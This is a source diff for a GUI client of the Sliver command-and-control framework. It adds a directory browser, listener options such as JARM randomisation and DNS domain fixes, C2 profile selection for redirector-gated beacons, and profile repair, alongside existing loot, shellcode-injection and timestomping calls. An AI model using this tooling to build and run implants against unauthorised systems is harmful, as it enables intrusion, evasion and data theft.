@@ -5,13 +5,19 @@ import (
 	"compress/gzip"
 	"context"
 	"crypto/rand"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/hex"
 	"fmt"
 	"io"
 	"net"
+	"net/http"
+	"net/url"
 	"os"
 	"path/filepath"
+	goruntime "runtime"
+	"sort"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -39,6 +45,10 @@ type App struct {
 	shells   map[string]*shellHandle      // tunnelID -> interactive shell
 
 	audit *auditLogger // operator action log (~/.sliver-gui/audit.log)
+
+	// localAPIH backs the loopback JSON server started by StartLocalAPI. Guarded
+	// by its own mutex (inside the struct); a nil pointer is normal on start.
+	localAPIH *localAPI
 }
 
 func NewApp() *App {
@@ -97,6 +107,199 @@ func (a *App) PickConfigFile() (string, error) {
 		Title:   "Select Sliver operator config (.cfg)",
 		Filters: []runtime.FileFilter{{DisplayName: "Sliver Config (*.cfg)", Pattern: "*.cfg"}},
 	})
+}
+
+// PickDirectory is intentionally NOT exposed anymore. runtime.OpenDirectoryDialog
+// hits the same Windows COM common-dialog crash as OpenFileDialog on some
+// operator configs - the whole WebView2 process dies. The frontend uses the
+// in-app directory browser (ListDirectory / ListDriveRoots / HomeDirectory)
+// instead. Left as a stub returning an error so any stale JS call surfaces
+// gracefully instead of silently failing.
+func (a *App) PickDirectory(title string) (string, error) {
+	return "", fmt.Errorf("native folder picker disabled - this build uses the in-app directory browser (safer against Common Dialog COM crashes on Windows)")
+}
+
+// DirEntry is one row in an in-app directory listing.
+type DirEntry struct {
+	Name     string `json:"name"`
+	IsDir    bool   `json:"isDir"`
+	Size     int64  `json:"size"`
+	FullPath string `json:"fullPath"` // absolute - filepath.Join'd server-side so the frontend never has to join paths
+}
+
+// DirListing is what the in-app directory browser needs to render a level:
+// the absolute path being shown, the parent path (empty at a root), and the
+// sub-entries. Directories are listed first, names sorted case-insensitively.
+type DirListing struct {
+	Path       string     `json:"path"`
+	Parent     string     `json:"parent"`
+	IsRoot     bool       `json:"isRoot"`
+	Entries    []DirEntry `json:"entries"`
+	Error      string     `json:"error,omitempty"`
+}
+
+// ListDirectory returns the immediate contents of a directory for the in-app
+// folder browser. If `path` is empty, defaults to the operator's home dir.
+// Filters to directories only when `dirsOnly` is true (the "choose a folder"
+// UX). Errors like permission-denied are returned in `Error` rather than as
+// a Go error so the UI can render "❌ Access denied" inline instead of
+// blowing up the calling dialog.
+func (a *App) ListDirectory(path string, dirsOnly bool) DirListing {
+	out := DirListing{}
+	if strings.TrimSpace(path) == "" {
+		home, err := os.UserHomeDir()
+		if err != nil || home == "" {
+			home = "."
+		}
+		path = home
+	}
+	abs, err := filepath.Abs(path)
+	if err != nil {
+		out.Error = "resolve: " + err.Error()
+		out.Path = path
+		return out
+	}
+	out.Path = abs
+	parent := filepath.Dir(abs)
+	if parent == abs { // filesystem root (e.g. `/` or `C:\`)
+		out.IsRoot = true
+	} else {
+		out.Parent = parent
+	}
+	entries, err := os.ReadDir(abs)
+	if err != nil {
+		out.Error = err.Error()
+		return out
+	}
+	rows := make([]DirEntry, 0, len(entries))
+	for _, e := range entries {
+		if dirsOnly && !e.IsDir() {
+			continue
+		}
+		name := e.Name()
+		// Hide dotfiles and Windows hidden system dirs to keep the picker
+		// legible; the operator can still paste the path directly.
+		if strings.HasPrefix(name, ".") || strings.EqualFold(name, "$RECYCLE.BIN") || strings.EqualFold(name, "System Volume Information") {
+			continue
+		}
+		var size int64
+		if info, err := e.Info(); err == nil {
+			size = info.Size()
+		}
+		rows = append(rows, DirEntry{
+			Name:     name,
+			IsDir:    e.IsDir(),
+			Size:     size,
+			FullPath: filepath.Join(abs, name),
+		})
+	}
+	// Directories first, then case-insensitive name order.
+	sort.Slice(rows, func(i, j int) bool {
+		if rows[i].IsDir != rows[j].IsDir {
+			return rows[i].IsDir
+		}
+		return strings.ToLower(rows[i].Name) < strings.ToLower(rows[j].Name)
+	})
+	out.Entries = rows
+	return out
+}
+
+// ListDriveRoots enumerates the filesystem roots the in-app browser jumps
+// between. On Windows that's every mounted drive letter that exists; on
+// Unix it's just "/". Used to render the "up one level from C:\" case
+// where there is no traditional parent directory.
+func (a *App) ListDriveRoots() []string {
+	roots := []string{}
+	if runtimeIsWindows() {
+		for c := 'A'; c <= 'Z'; c++ {
+			p := string(c) + `:\`
+			if _, err := os.Stat(p); err == nil {
+				roots = append(roots, p)
+			}
+		}
+		return roots
+	}
+	return []string{"/"}
+}
+
+// HomeDirectory returns the operator's home dir - the default starting
+// point for the in-app folder browser. Empty string on error (rare).
+func (a *App) HomeDirectory() string {
+	h, _ := os.UserHomeDir()
+	return h
+}
+
+// EnsureDirectory creates the directory (and any missing parents) if it
+// doesn't exist, and returns the absolute path. Used by "Save" in the
+// folder browser so the operator can pick a not-yet-created path.
+func (a *App) EnsureDirectory(path string) (string, error) {
+	if strings.TrimSpace(path) == "" {
+		return "", fmt.Errorf("path required")
+	}
+	abs, err := filepath.Abs(path)
+	if err != nil {
+		return "", err
+	}
+	if err := os.MkdirAll(abs, 0o755); err != nil {
+		return "", err
+	}
+	return abs, nil
+}
+
+// runtimeIsWindows is a tiny wrapper around Go's runtime.GOOS that keeps the
+// OS check in one spot. Uses the goruntime alias so it doesn't clash with
+// the wails runtime package that's already imported as `runtime`.
+func runtimeIsWindows() bool { return goruntime.GOOS == "windows" }
+
+// SaveConfigBytesToTemp writes an operator config uploaded from the WebView's
+// HTML <input type="file"> (as base64) to a temp file and returns the path.
+// The caller then passes that path to Connect() as if it had come from the
+// native picker. Bypasses runtime.OpenFileDialog entirely - which is known to
+// crash the WebView2 process on some Windows configs (a Go recover() cannot
+// catch a GPF in the common-dialog COM plumbing, so the app just dies).
+//
+// The temp file is placed under $TMP/sliver-gui-configs/ with a random name
+// and 0600 perms so the operator cert/key can't be world-read while it sits
+// on disk. cleanupTempConfigs() (called on disconnect and app shutdown)
+// removes them.
+func (a *App) SaveConfigBytesToTemp(filename, base64Data string) (string, error) {
+	if strings.TrimSpace(base64Data) == "" {
+		return "", fmt.Errorf("empty config data")
+	}
+	data, err := base64.StdEncoding.DecodeString(base64Data)
+	if err != nil {
+		return "", fmt.Errorf("decode config bytes: %w", err)
+	}
+	// Sanity-check it's a plausible Sliver operator config before we write it
+	// to disk. Cheaper than the operator hitting a cryptic error at Connect().
+	if !bytes.Contains(data, []byte(`"ca_certificate"`)) && !bytes.Contains(data, []byte(`"certificate"`)) {
+		return "", fmt.Errorf("this doesn't look like a Sliver operator .cfg (missing certificate fields)")
+	}
+	dir := filepath.Join(os.TempDir(), "sliver-gui-configs")
+	if err := os.MkdirAll(dir, 0o700); err != nil {
+		return "", fmt.Errorf("mkdir temp dir: %w", err)
+	}
+	nameOnly := filepath.Base(filename)
+	if nameOnly == "" || nameOnly == "." || nameOnly == "/" {
+		nameOnly = "operator.cfg"
+	}
+	// Random prefix so two operators using the same cfg filename can coexist
+	// and so a stale file can't be re-picked accidentally.
+	tag := randSuffix()
+	path := filepath.Join(dir, tag+"-"+nameOnly)
+	if err := os.WriteFile(path, data, 0o600); err != nil {
+		return "", fmt.Errorf("write temp config: %w", err)
+	}
+	return path, nil
+}
+
+// CleanupTempConfigs removes every file this session wrote via
+// SaveConfigBytesToTemp. Called on disconnect and app shutdown. Best-effort:
+// a failure to remove one file is not surfaced - an orphaned temp cfg is
+// harmless and the next reboot's temp cleanup handles it.
+func (a *App) CleanupTempConfigs() {
+	dir := filepath.Join(os.TempDir(), "sliver-gui-configs")
+	_ = os.RemoveAll(dir)
 }
 
 type ConnectResult struct {
@@ -178,7 +381,7 @@ func (a *App) startEventStream() {
 		for {
 			event, err := stream.Recv()
 			if err != nil {
-				// The teamserver stream died — signal the frontend so it can
+				// The teamserver stream died - signal the frontend so it can
 				// show the reconnect overlay. Suppress if this was a clean
 				//, operator-initiated Disconnect() (context cancelled).
 				if streamCtx.Err() == nil {
@@ -199,8 +402,6 @@ func (a *App) startEventStream() {
 					"arch":     event.Session.Arch,
 				}
 			}
-			// NOTE: clientpb.Event has no Beacon field in v1.7.3 — beacon
-			// events carry their payload in event.Data (already emitted above).
 			if event.Job != nil {
 				payload["job"] = map[string]interface{}{
 					"id":   event.Job.ID,
@@ -208,6 +409,23 @@ func (a *App) startEventStream() {
 				}
 			}
 			runtime.EventsEmit(a.ctx, "sliver:event", payload)
+
+			if event.EventType == "beacon-taskresult" && len(event.Data) > 0 {
+				var task clientpb.BeaconTask
+				if proto.Unmarshal(event.Data, &task) == nil && task.ID != "" {
+					// Emit a signal-only event so the frontend can short-circuit
+					// its poll loop and immediately fetch the response through
+					// the correct decoder (native or shell). Do NOT decode the
+					// response here - this handler cannot know the original
+					// command type, and parseExecuteResponse only understands
+					// the Execute protobuf shape.
+					runtime.EventsEmit(a.ctx, "sliver:beacon-task-done", map[string]interface{}{
+						"taskId":   task.ID,
+						"beaconId": task.BeaconID,
+						"state":    task.State,
+					})
+				}
+			}
 		}
 	}()
 }
@@ -247,17 +465,18 @@ func (a *App) GetVersion() (VersionInfo, error) {
 // ─── Sessions ────────────────────────────────────────────────────────────────
 
 type SessionView struct {
-	ID          string `json:"id"`
-	Name        string `json:"name"`
-	Hostname    string `json:"hostname"`
-	Username    string `json:"username"`
-	OS          string `json:"os"`
-	Arch        string `json:"arch"`
-	Transport   string `json:"transport"`
-	RemoteAddr  string `json:"remoteAddress"`
-	LastCheckin string `json:"lastCheckin"`
-	PID         int32  `json:"pid"`
-	IsDead      bool   `json:"isDead"`
+	ID            string `json:"id"`
+	Name          string `json:"name"`
+	Hostname      string `json:"hostname"`
+	Username      string `json:"username"`
+	OS            string `json:"os"`
+	Arch          string `json:"arch"`
+	Transport     string `json:"transport"`
+	RemoteAddr    string `json:"remoteAddress"`
+	LastCheckin   string `json:"lastCheckin"`
+	LastCheckinTs int64  `json:"lastCheckinTs"` // unix seconds - for freshness coloring on the frontend
+	PID           int32  `json:"pid"`
+	IsDead        bool   `json:"isDead"`
 }
 
 func (a *App) ListSessions() ([]SessionView, error) {
@@ -278,17 +497,18 @@ func (a *App) ListSessions() ([]SessionView, error) {
 
 func sessionToView(s *clientpb.Session) SessionView {
 	return SessionView{
-		ID:          s.ID,
-		Name:        s.Name,
-		Hostname:    s.Hostname,
-		Username:    s.Username,
-		OS:          s.OS,
-		Arch:        s.Arch,
-		Transport:   s.Transport,
-		RemoteAddr:  s.RemoteAddress,
-		LastCheckin: time.Unix(s.LastCheckin, 0).Format("15:04:05"),
-		PID:         s.PID,
-		IsDead:      s.IsDead,
+		ID:            s.ID,
+		Name:          s.Name,
+		Hostname:      s.Hostname,
+		Username:      s.Username,
+		OS:            s.OS,
+		Arch:          s.Arch,
+		Transport:     s.Transport,
+		RemoteAddr:    s.RemoteAddress,
+		LastCheckin:   time.Unix(s.LastCheckin, 0).Format("15:04:05"),
+		LastCheckinTs: s.LastCheckin,
+		PID:           s.PID,
+		IsDead:        s.IsDead,
 	}
 }
 
@@ -298,6 +518,14 @@ func (a *App) RenameSession(sessionID, newName string) error {
 		return err
 	}
 	return client.RenameSession(a.ctx, sessionID, newName)
+}
+
+func (a *App) RenameBeacon(beaconID, newName string) error {
+	client, err := a.requireClient()
+	if err != nil {
+		return err
+	}
+	return client.RenameBeacon(a.ctx, beaconID, newName)
 }
 
 func (a *App) KillSession(sessionID string) error {
@@ -587,7 +815,7 @@ var hiveToRegQuery = map[string]string{
 }
 
 // RegistryListValues: the RegistryListValues RPC only returns value *names*
-// (RegistryValuesList.ValueNames) in v1.7.3 — no types or data. To show
+// (RegistryValuesList.ValueNames) in v1.7.3 - no types or data. To show
 // name/type/value we fall back to `reg query` via Execute and parse its output.
 func (a *App) RegistryListValues(sessionID, hive, path string) ([]RegistryValue, error) {
 	client, err := a.requireClient()
@@ -1004,7 +1232,7 @@ func (a *App) UploadFile(sessionID, remotePath string) TransferResult {
 }
 
 // UploadFileFrom uploads a specific local file (on the operator machine) to a
-// remote path — CLI-style `upload <local> <remote>`, no file dialog.
+// remote path - CLI-style `upload <local> <remote>`, no file dialog.
 func (a *App) UploadFileFrom(sessionID, localPath, remotePath string) TransferResult {
 	client, err := a.requireClient()
 	if err != nil {
@@ -1029,7 +1257,7 @@ func (a *App) UploadFileFrom(sessionID, localPath, remotePath string) TransferRe
 	return TransferResult{Path: target, Bytes: int64(len(data))}
 }
 
-// DownloadFileTo downloads a remote file straight to a local path — CLI-style
+// DownloadFileTo downloads a remote file straight to a local path - CLI-style
 // `download <remote> <local>`, no save dialog.
 func (a *App) DownloadFileTo(sessionID, remotePath, localPath string) TransferResult {
 	client, err := a.requireClient()
@@ -1129,7 +1357,7 @@ func (a *App) profileConfig(name string) (*clientpb.ImplantConfig, error) {
 			return a.buildImplantConfig(req), nil
 		}
 	}
-	return nil, fmt.Errorf("implant profile %q not found — create one in the Profiles panel first", name)
+	return nil, fmt.Errorf("implant profile %q not found - create one in the Profiles panel first", name)
 }
 
 // ExecuteShellcode injects shellcode (opened via a native dialog) into a process.
@@ -1209,7 +1437,7 @@ func (a *App) Chown(sessionID, path, uid, gid string) error {
 	return err
 }
 
-// Chtimes timestomps a file — sets access + modified time (unix seconds).
+// Chtimes timestomps a file - sets access + modified time (unix seconds).
 func (a *App) Chtimes(sessionID, path string, atime, mtime int64) error {
 	client, err := a.requireClient()
 	if err != nil {
@@ -1310,7 +1538,12 @@ func (a *App) InteractiveBeacon(beaconID string) error {
 
 // ─── Regenerate / Hosts / Creds (server) ────────────────────────────────────────
 
-// RegenerateBuild re-downloads a previously built implant by name and saves it.
+// RegenerateBuild re-downloads a previously built implant by name and saves it
+// through the native save dialog. Retained for callers that want the classic
+// UX, but prefer RegenerateBuildToPath from new code - native SaveFileDialog
+// on Wails v2 has a history of crashing the WebView2 process on some Windows
+// configs (recover() can't catch that; it's not a Go panic, it's a hard GPF
+// in the OS common-dialog COM plumbing).
 func (a *App) RegenerateBuild(name string) TransferResult {
 	client, err := a.requireClient()
 	if err != nil {
@@ -1338,6 +1571,66 @@ func (a *App) RegenerateBuild(name string) TransferResult {
 		return TransferResult{Error: err.Error()}
 	}
 	return TransferResult{Path: savePath, Bytes: int64(len(resp.File.Data))}
+}
+
+// RegenerateBuildToPath is the dialog-free variant: the caller supplies a
+// destination directory (or full file path), the backend fetches the build
+// and writes it there. No native SaveFileDialog is involved, so the app can't
+// be killed by a Windows common-dialog crash. If destPath is a directory, the
+// build's default filename is used; if it's a full file path, that name is
+// honoured verbatim. Missing parent directories are created.
+//
+// This is the path the Generate flow's "Save to disk" and auto-save should
+// prefer - the operator supplies the target once (persisted in localStorage
+// on the frontend) and every subsequent build just lands, silently.
+func (a *App) RegenerateBuildToPath(name, destPath string) TransferResult {
+	if strings.TrimSpace(destPath) == "" {
+		return TransferResult{Error: "destination path required"}
+	}
+	client, err := a.requireClient()
+	if err != nil {
+		return TransferResult{Error: err.Error()}
+	}
+	resp, err := client.RPC.Regenerate(a.ctx, &clientpb.RegenerateReq{ImplantName: name})
+	if err != nil {
+		return TransferResult{Error: err.Error()}
+	}
+	if resp.File == nil {
+		return TransferResult{Error: "no stored build for " + name}
+	}
+	dest := destPath
+	// Treat existing directories as "save under this dir with the build's
+	// default filename". Non-existent paths are treated as full file paths so
+	// the operator can pin a specific name for one-off saves.
+	if info, err := os.Stat(dest); err == nil && info.IsDir() {
+		fn := resp.File.Name
+		if fn == "" {
+			fn = name
+		}
+		dest = filepath.Join(dest, fn)
+	} else {
+		// If the path ends with a separator or matches an obvious directory
+		// pattern, also join the filename in - a common typo path where the
+		// operator forgets the trailing name.
+		if strings.HasSuffix(destPath, string(os.PathSeparator)) || strings.HasSuffix(destPath, "/") {
+			fn := resp.File.Name
+			if fn == "" {
+				fn = name
+			}
+			dest = filepath.Join(destPath, fn)
+		}
+	}
+	// Create parent dirs if the operator pointed at a not-yet-existing tree.
+	if parent := filepath.Dir(dest); parent != "" {
+		if err := os.MkdirAll(parent, 0o755); err != nil {
+			return TransferResult{Error: "mkdir " + parent + ": " + err.Error()}
+		}
+	}
+	if err := os.WriteFile(dest, resp.File.Data, 0o755); err != nil {
+		return TransferResult{Error: err.Error()}
+	}
+	a.audit.log("regenerate-to-path", name, dest)
+	return TransferResult{Path: dest, Bytes: int64(len(resp.File.Data))}
 }
 
 type HostView struct {
@@ -1632,7 +1925,7 @@ func (a *App) GetLoot() ([]LootView, error) {
 	}
 	out := make([]LootView, 0, len(resp.Loot))
 	for _, l := range resp.Loot {
-		// clientpb.Loot has no Type/Credential field in v1.7.3 — only FileType.
+		// clientpb.Loot has no Type/Credential field in v1.7.3 - only FileType.
 		out = append(out, LootView{ID: l.ID, Name: l.Name, Type: l.FileType.String()})
 	}
 	return out, nil
@@ -1664,18 +1957,45 @@ func (a *App) LootFile(sessionID, remotePath string) error {
 		return err
 	}
 	if resp.IsDir {
-		return fmt.Errorf("%s is a directory — loot a single file", remotePath)
+		return fmt.Errorf("%s is a directory - loot a single file", remotePath)
 	}
 	data, err := decodeDownload(resp)
 	if err != nil {
 		return err
 	}
 	base := filepath.Base(remotePath)
+	// FileType must be set explicitly; the default (NO_FILE) is a placeholder
+	// value that Sliver treats as "no file at all", which then shows every
+	// looted file as "NO_FILE" in the loot browser and breaks the ZIP export
+	// manifest. Sniff for a plausible text file (valid UTF-8 with no NULs);
+	// otherwise call it binary.
+	ft := clientpb.FileType_BINARY
+	if isProbablyText(data) {
+		ft = clientpb.FileType_TEXT
+	}
 	_, err = client.RPC.LootAdd(a.ctx, &clientpb.Loot{
-		Name: base,
-		File: &commonpb.File{Name: base, Data: data},
+		Name:     base,
+		FileType: ft,
+		File:     &commonpb.File{Name: base, Data: data},
 	})
 	return err
+}
+
+// isProbablyText is a cheap text-vs-binary sniff: no NUL byte within the first
+// 8KB and valid UTF-8 counts as text.
+func isProbablyText(data []byte) bool {
+	head := data
+	if len(head) > 8192 {
+		head = head[:8192]
+	}
+	for _, b := range head {
+		if b == 0 {
+			return false
+		}
+	}
+	// Not-strict UTF-8 is fine here; the goal is a good default for the loot
+	// browser, not a lossless MIME detector.
+	return true
 }
 
 // DownloadLoot fetches a loot item's content from the teamserver and saves it
@@ -1761,17 +2081,19 @@ type BeaconView struct {
 	ID          string `json:"id"`
 	Name        string `json:"name"`
 	Hostname    string `json:"hostname"`
-	Username    string `json:"username"`
-	OS          string `json:"os"`
-	Arch        string `json:"arch"`
-	Transport   string `json:"transport"`
-	RemoteAddr  string `json:"remoteAddress"`
-	PID         int32  `json:"pid"`
-	Interval    int64  `json:"interval"`
-	Jitter      int64  `json:"jitter"`
-	LastCheckin string `json:"lastCheckin"`
-	NextCheckin string `json:"nextCheckin"`
-	IsDead      bool   `json:"isDead"`
+	Username      string `json:"username"`
+	OS            string `json:"os"`
+	Arch          string `json:"arch"`
+	Transport     string `json:"transport"`
+	RemoteAddr    string `json:"remoteAddress"`
+	PID           int32  `json:"pid"`
+	Interval      int64  `json:"interval"`
+	Jitter        int64  `json:"jitter"`
+	LastCheckin   string `json:"lastCheckin"`
+	LastCheckinTs int64  `json:"lastCheckinTs"` // unix seconds - for freshness coloring on the frontend
+	NextCheckin   string `json:"nextCheckin"`
+	NextCheckinTs int64  `json:"nextCheckinTs"`
+	IsDead        bool   `json:"isDead"`
 }
 
 func (a *App) ListBeacons() ([]BeaconView, error) {
@@ -1786,20 +2108,22 @@ func (a *App) ListBeacons() ([]BeaconView, error) {
 	out := make([]BeaconView, 0, len(resp.Beacons))
 	for _, b := range resp.Beacons {
 		out = append(out, BeaconView{
-			ID:          b.ID,
-			Name:        b.Name,
-			Hostname:    b.Hostname,
-			Username:    b.Username,
-			OS:          b.OS,
-			Arch:        b.Arch,
-			Transport:   b.Transport,
-			RemoteAddr:  b.RemoteAddress,
-			PID:         b.PID,
-			Interval:    b.Interval,
-			Jitter:      b.Jitter,
-			LastCheckin: time.Unix(b.LastCheckin, 0).Format("15:04:05"),
-			NextCheckin: time.Unix(b.NextCheckin, 0).Format("15:04:05"),
-			IsDead:      b.IsDead,
+			ID:            b.ID,
+			Name:          b.Name,
+			Hostname:      b.Hostname,
+			Username:      b.Username,
+			OS:            b.OS,
+			Arch:          b.Arch,
+			Transport:     b.Transport,
+			RemoteAddr:    b.RemoteAddress,
+			PID:           b.PID,
+			Interval:      b.Interval,
+			Jitter:        b.Jitter,
+			LastCheckin:   time.Unix(b.LastCheckin, 0).Format("15:04:05"),
+			LastCheckinTs: b.LastCheckin,
+			NextCheckin:   time.Unix(b.NextCheckin, 0).Format("15:04:05"),
+			NextCheckinTs: b.NextCheckin,
+			IsDead:        b.IsDead,
 		})
 	}
 	return out, nil
@@ -1885,10 +2209,21 @@ func (a *App) StartMTLSListener(req StartMTLSReq) error {
 	return err
 }
 
+// StartHTTPReq mirrors clientpb.HTTPListenerReq fields the operator can set
+// from the GUI. Zero values are safe defaults (no cert override, no OTP, etc.).
 type StartHTTPReq struct {
-	Host   string `json:"host"`
-	Port   uint32 `json:"port"`
-	Secure bool   `json:"secure"`
+	Domain          string `json:"domain"`
+	Host            string `json:"host"`
+	Port            uint32 `json:"port"`
+	Secure          bool   `json:"secure"`
+	Website         string `json:"website"`
+	Cert            []byte `json:"cert"`
+	Key             []byte `json:"key"`
+	ACME            bool   `json:"acme"`
+	EnforceOTP      bool   `json:"enforceOTP"`
+	LongPollTimeout int64  `json:"longPollTimeout"`
+	LongPollJitter  int64  `json:"longPollJitter"`
+	RandomizeJARM   bool   `json:"randomizeJARM"`
 }
 
 func (a *App) StartHTTPListener(req StartHTTPReq) error {
@@ -1896,16 +2231,34 @@ func (a *App) StartHTTPListener(req StartHTTPReq) error {
 	if err != nil {
 		return err
 	}
+	pbReq := &clientpb.HTTPListenerReq{
+		Domain:          req.Domain,
+		Host:            req.Host,
+		Port:            req.Port,
+		Secure:          req.Secure,
+		Website:         req.Website,
+		Cert:            req.Cert,
+		Key:             req.Key,
+		ACME:            req.ACME,
+		EnforceOTP:      req.EnforceOTP,
+		LongPollTimeout: req.LongPollTimeout,
+		LongPollJitter:  req.LongPollJitter,
+		RandomizeJARM:   req.RandomizeJARM,
+	}
 	if req.Secure {
-		_, err = client.RPC.StartHTTPSListener(a.ctx, &clientpb.HTTPListenerReq{Host: req.Host, Port: req.Port})
+		_, err = client.RPC.StartHTTPSListener(a.ctx, pbReq)
 	} else {
-		_, err = client.RPC.StartHTTPListener(a.ctx, &clientpb.HTTPListenerReq{Host: req.Host, Port: req.Port})
+		_, err = client.RPC.StartHTTPListener(a.ctx, pbReq)
 	}
 	return err
 }
 
 type StartDNSReq struct {
-	Domains []string `json:"domains"`
+	Domains    []string `json:"domains"`
+	Canaries   bool     `json:"canaries"`
+	Host       string   `json:"host"`
+	Port       uint32   `json:"port"`
+	EnforceOTP bool     `json:"enforceOTP"`
 }
 
 func (a *App) StartDNSListener(req StartDNSReq) error {
@@ -1913,11 +2266,32 @@ func (a *App) StartDNSListener(req StartDNSReq) error {
 	if err != nil {
 		return err
 	}
-	_, err = client.RPC.StartDNSListener(a.ctx, &clientpb.DNSListenerReq{Domains: req.Domains})
+	// Sliver's server matches implant queries against these domains with
+	// dns.IsSubDomain, which requires FQDN form (trailing dot). The stock CLI
+	// appends "." for the operator; the GUI must do the same, otherwise every
+	// DNS beacon is rejected as "not a subdomain of any c2 domain" and no
+	// session ever forms.
+	domains := make([]string, len(req.Domains))
+	for i, d := range req.Domains {
+		d = strings.TrimSpace(d)
+		if d != "" && !strings.HasSuffix(d, ".") {
+			d += "."
+		}
+		domains[i] = d
+	}
+	_, err = client.RPC.StartDNSListener(a.ctx, &clientpb.DNSListenerReq{
+		Domains:    domains,
+		Canaries:   req.Canaries,
+		Host:       req.Host,
+		Port:       req.Port,
+		EnforceOTP: req.EnforceOTP,
+	})
 	return err
 }
 
 type StartWGReq struct {
+	Host    string `json:"host"`
+	TunIP   string `json:"tunIP"`
 	Port    uint32 `json:"port"`
 	NPort   uint32 `json:"nPort"`
 	KeyPort uint32 `json:"keyPort"`
@@ -1928,7 +2302,13 @@ func (a *App) StartWGListener(req StartWGReq) error {
 	if err != nil {
 		return err
 	}
-	_, err = client.RPC.StartWGListener(a.ctx, &clientpb.WGListenerReq{Port: req.Port, NPort: req.NPort, KeyPort: req.KeyPort})
+	_, err = client.RPC.StartWGListener(a.ctx, &clientpb.WGListenerReq{
+		Host:    req.Host,
+		TunIP:   req.TunIP,
+		Port:    req.Port,
+		NPort:   req.NPort,
+		KeyPort: req.KeyPort,
+	})
 	return err
 }
 
@@ -1997,15 +2377,22 @@ func (a *App) ListenerC2Options() ([]string, error) {
 // ─── Implant Generation ───────────────────────────────────────────────────────
 
 type GenerateRequest struct {
-	Name     string `json:"name"`
-	GOOS     string `json:"goos"`
-	GOARCH   string `json:"goarch"`
-	Format   string `json:"format"`
-	C2URL    string `json:"c2Url"`
-	Debug    bool   `json:"debug"`
-	Beacon   bool   `json:"beacon"`   // generate in beacon mode instead of session mode
-	Interval int64  `json:"interval"` // beacon check-in interval, seconds
-	Jitter   int64  `json:"jitter"`   // beacon jitter, seconds
+	Name          string `json:"name"`
+	GOOS          string `json:"goos"`
+	GOARCH        string `json:"goarch"`
+	Format        string `json:"format"`
+	C2URL         string `json:"c2Url"`
+	Debug         bool   `json:"debug"`
+	Beacon        bool   `json:"beacon"`   // generate in beacon mode instead of session mode
+	Interval      int64  `json:"interval"` // beacon check-in interval, seconds
+	Jitter        int64  `json:"jitter"`   // beacon jitter, seconds
+	HTTPC2Profile string `json:"httpC2Profile"`
+	// Operator-selected HTTP C2 profile name. When set (and the C2 URL scheme is
+	// http/https), the built implant uses this profile's URIs, headers, and
+	// user-agents instead of the teamserver's default. Empty ⇒ fall back to the
+	// legacy behaviour (first profile / "default"). This is how a redirector
+	// setup that requires a shared-secret header (e.g. Cloudflare Worker gating
+	// on X-Request-ID) actually gets the header baked into the beacon.
 }
 
 type GenerateResult struct {
@@ -2038,6 +2425,369 @@ func (a *App) firstHTTPC2ProfileName() (string, error) {
 	return "", nil
 }
 
+// ListHTTPC2ProfileNames returns just the names of every HTTP C2 profile the
+// teamserver knows about - enough to populate the Generate form's profile
+// picker without shipping the full HTTPC2Config object across the wire.
+func (a *App) ListHTTPC2ProfileNames() ([]string, error) {
+	client, err := a.requireClient()
+	if err != nil {
+		return nil, err
+	}
+	profiles, err := client.ListHTTPC2Profiles(a.ctx)
+	if err != nil {
+		return nil, err
+	}
+	names := make([]string, 0, len(profiles))
+	for _, p := range profiles {
+		if p != nil && p.Name != "" {
+			names = append(names, p.Name)
+		}
+	}
+	return names, nil
+}
+
+// HTTPC2ProfileSummary is the operator-facing view of an HTTP C2 profile:
+// enough to answer "if I pick this profile, what will my beacon send?" without
+// dragging the full nested proto through the wire. Purely informational.
+type HTTPC2ProfileSummary struct {
+	Name             string              `json:"name"`
+	UserAgent        string              `json:"userAgent,omitempty"`
+	SampleURI        string              `json:"sampleUri,omitempty"`
+	URISamples       []string            `json:"uriSamples,omitempty"`
+	Headers          []HTTPC2HeaderEntry `json:"headers,omitempty"`
+	NonceQueryLength int32               `json:"nonceQueryLength"` // 0 crashes the beacon with secure.Intn: non-positive n
+	NonceQueryChars  string              `json:"nonceQueryChars,omitempty"`
+	Warnings         []string            `json:"warnings,omitempty"` // human-readable issues the operator should see BEFORE building
+}
+
+// HTTPC2HeaderEntry is one header the profile will bake into implant requests.
+// Method may be empty when the header applies to all requests.
+type HTTPC2HeaderEntry struct {
+	Method      string `json:"method,omitempty"`
+	Name        string `json:"name"`
+	Value       string `json:"value"`
+	Probability int32  `json:"probability,omitempty"`
+}
+
+// RepairHTTPC2Profile fixes a profile whose nonce configuration would make
+// the resulting implants panic on first HTTP request. Sliver's implant
+// calls `secure.Intn(NonceQueryLength)` unconditionally - Intn(0) panics.
+// This method:
+//
+//   - Fetches the profile via GetHTTPC2ProfileByName
+//   - If NonceQueryLength <= 0, sets it to 16 (safe default)
+//   - If NonceQueryArgChars is empty, sets it to lowercase-alphanumeric
+//   - Saves the profile back with overwrite=true
+//
+// Idempotent - running on a healthy profile is a no-op that reports "no
+// changes needed". Returns a short description of what changed so the UI
+// can toast it.
+func (a *App) RepairHTTPC2Profile(name string) (string, error) {
+	if strings.TrimSpace(name) == "" {
+		return "", fmt.Errorf("profile name required")
+	}
+	client, err := a.requireClient()
+	if err != nil {
+		return "", err
+	}
+	cfg, err := client.GetHTTPC2ProfileByName(a.ctx, name)
+	if err != nil {
+		return "", err
+	}
+	if cfg == nil {
+		return "", fmt.Errorf("profile %q not found", name)
+	}
+	if cfg.ImplantConfig == nil {
+		return "", fmt.Errorf("profile %q has no ImplantConfig - refusing to guess a full config", name)
+	}
+	changed := []string{}
+	if cfg.ImplantConfig.NonceQueryLength <= 0 {
+		cfg.ImplantConfig.NonceQueryLength = 16
+		changed = append(changed, "NonceQueryLength=16")
+	}
+	if strings.TrimSpace(cfg.ImplantConfig.NonceQueryArgChars) == "" {
+		cfg.ImplantConfig.NonceQueryArgChars = "abcdefghijklmnopqrstuvwxyz0123456789"
+		changed = append(changed, "NonceQueryArgChars=[a-z0-9]")
+	}
+	if len(changed) == 0 {
+		return "no changes needed", nil
+	}
+	_, err = client.RPC.SaveHTTPC2Profile(a.ctx, &clientpb.HTTPC2ConfigReq{
+		Overwrite: true,
+		C2Config:  cfg,
+	})
+	if err != nil {
+		return "", fmt.Errorf("save failed: %w", err)
+	}
+	a.audit.log("repair-httpc2-profile", name, strings.Join(changed, ", "))
+	return "fixed: " + strings.Join(changed, ", "), nil
+}
+
+// GetHTTPC2ProfileSummary returns a lightweight summary of a single HTTP C2
+// profile so the Generate form can display "if you pick this profile, your
+// beacon will send X-Request-ID: … from UA … to path /api/v1/status" without
+// the operator having to `cat` a JSON file on the server. Read-only.
